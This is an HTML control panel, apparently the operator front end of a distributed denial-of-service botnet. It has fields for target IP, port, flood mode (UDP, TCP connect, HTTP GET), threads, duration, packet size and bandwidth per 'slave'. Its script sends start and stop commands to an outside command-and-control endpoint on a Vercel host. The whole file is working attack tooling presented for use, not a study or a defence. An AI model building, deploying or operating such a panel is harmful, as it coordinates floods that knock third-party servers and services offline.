<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Master Control</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f0f0f;
      color: #0f0;
      margin: 20px;
      text-align: center;
    }
    h1 { color: #0f0; }
    input, select, button {
      padding: 10px;
      margin: 8px;
      font-size: 16px;
      border-radius: 5px;
    }
    button {
      background: #0f0;
      color: black;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover { background: #00cc00; }
    .stop { background: #ff4444; color: white; }
    .info {
      margin-top: 20px;
      font-size: 14px;
      color: #aaa;
    }
  </style>
</head>
<body>
  <h1>🚀 Master Control Panel</h1>
  <p><strong>Controller:</strong> https://iosdfj.vercel.app</p>

  <br>
  <input id="ip" placeholder="Target IP" value="127.0.0.1"><br>
  <input id="port" placeholder="Port" value="53" type="number"><br>
  
  <select id="mode">
    <option value="udp">UDP (L4)</option>
    <option value="tcp">TCP Connect (L4)</option>
    <option value="http">HTTP GET (L7)</option>
  </select><br>

  <input id="threads" placeholder="Threads" value="25" type="number"><br>
  <input id="duration" placeholder="Duration (seconds)" value="25" type="number"><br>
  <input id="psize" placeholder="Packet Size" value="1024" type="number"><br>
  <input id="mbps" placeholder="Target Mbps per slave" value="4" type="number"><br>

  <br>
  <button onclick="startAttack()">🚀 START ALL SLAVES</button>
  <button class="stop" onclick="stopAttack()">⛔ STOP ALL SLAVES</button>

  <div class="info">
    <p>Status: <span id="status">Ready</span></p>
  </div>

  <script>
    const apiUrl = "https://superdupertuff.vercel.app/api/command";

    async function startAttack() {
      const data = {
        action: "start",
        target_ip: document.getElementById('ip').value,
        port: parseInt(document.getElementById('port').value),
        mode: document.getElementById('mode').value,
        threads: parseInt(document.getElementById('threads').value),
        duration: parseInt(document.getElementById('duration').value),
        packet_size: parseInt(document.getElementById('psize').value),
        target_mbps: parseFloat(document.getElementById('mbps').value)
      };

      await fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });

      document.getElementById('status').innerHTML = '✅ <b>START</b> command sent!';
      setTimeout(() => document.getElementById('status').innerHTML = 'Ready', 4000);
    }

    async function stopAttack() {
      await fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: "stop" })
      });

      document.getElementById('status').innerHTML = '⛔ <b>STOP</b> command sent!';
      setTimeout(() => document.getElementById('status').innerHTML = 'Ready', 4000);
    }
  </script>
</body>
</html>
